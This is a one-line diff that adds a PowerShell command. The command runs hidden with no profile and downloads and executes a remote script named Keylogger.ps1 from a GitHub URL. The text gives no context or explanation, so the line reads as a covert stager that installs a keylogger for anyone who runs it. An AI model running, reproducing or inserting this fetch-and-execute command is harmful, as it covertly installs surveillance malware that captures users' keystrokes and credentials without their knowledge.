@@ -1,0 +1,1 @@
+powershell -nop -w hidden IEX("(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/securethelogs/Keylogger/master/Keylogger.ps1')")
